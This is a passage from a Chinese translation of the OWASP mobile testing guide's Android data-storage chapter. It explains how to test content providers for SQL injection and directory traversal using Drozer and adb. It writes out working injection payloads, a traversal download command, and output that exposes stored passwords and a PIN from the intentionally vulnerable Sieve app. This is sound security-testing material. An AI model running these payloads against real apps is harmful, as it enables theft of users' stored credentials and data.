# Android数据存储[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#android-data-storage) · part 4 · part 2

> 分段 2/2。索引见 `Android数据存储-p4.md`。

#### Content Provider(内容提供者)中的 SQL 注入[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#sql-injection-in-content-providers)

Android 平台提倡使用 SQLite 数据库来存储用户数据。因为这些数据库是基于 SQL 的，所以它们可能容易受到 SQL 注入的攻击。您可以使用 Drozer 模块`app.provider.query`通过操作传递给内容提供程序的投影和选择字段来测试 SQL 注入：

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELECT ' FROM Passwords

dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

如果应用程序容易受到 SQL 注入攻击，它将返回详细的错误消息。Android 上的 SQL 注入可用于修改或查询来自易受攻击的内容提供程序的数据。在下面的示例中，Drozer 模块`app.provider.query`用于列出所有数据库表：

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
| table | Key              | Key              | 5        | CREATE TABLE ... |
```

SQL 注入也可用于从其他受保护的表中检索数据：

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"
| Password | pin |
| thisismypassword | 9876 |
```

您可以使用该模块自动执行这些步骤，该`scanner.provider.injection`模块会自动在应用程序中查找易受攻击的Content Provider(内容提供者)：

```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
```

#### 基于文件系统的Content Provider(内容提供者)[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#file-system-based-content-providers)

Content Provider(内容提供者)可以提供对底层文件系统的访问。这允许应用程序共享文件（Android 沙箱通常会阻止这种情况）。您可以使用 Drozer 模块`app.provider.read`和`app.provider.download`分别从导出的基于文件的内容提供程序读取和下载文件。这些Content Provider(内容提供者)容易受到目录遍历的影响，这允许读取目标应用程序沙箱中其他受保护的文件。

```
dz> run app.provider.download content://com.vulnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/database.db /home/user/database.db
Written 24488 bytes
```

使用该`scanner.provider.traversal`模块自动执行查找易受目录遍历影响的内容提供程序的过程：

```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
  content://com.mwr.example.sieve.FileBackupProvider/
  content://com.mwr.example.sieve.FileBackupProvider
```

请注意，`adb`也可用于查询Content Provider(内容提供者)：

```
$ adb shell content query --uri content://com.owaspomtg.vulnapp.provider.CredentialProvider/credentials
Row: 0 id=1, username=admin, password=StrongPwd
Row: 1 id=2, username=test, password=test
...
```

## 通过用户界面检查敏感数据泄露 (MSTG-STORAGE-7)[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#checking-for-sensitive-data-disclosure-through-the-user-interface-mstg-storage-7)

### 概述[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#overview_6)

例如，在注册帐户或付款时输入敏感信息是使用许多应用程序的重要部分。此数据可能是财务信息，例如信用卡数据或用户帐户密码。如果应用程序在键入时未正确屏蔽数据，则数据可能会暴露。

为了防止泄露和减轻诸如[肩窥](https://en.wikipedia.org/wiki/Shoulder_surfing_(computer_security))之类的风险，您应该验证没有通过用户界面暴露任何敏感数据，除非明确要求（例如输入密码）。对于需要显示的数据，应该对其进行适当的屏蔽，通常是显示星号或点而不是明文。

仔细检查所有显示此类信息或将其作为输入的 UI 组件。搜索敏感信息的任何痕迹，并评估是否应将其屏蔽或完全删除。

### 静态分析[¶](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#static-analysis_6)

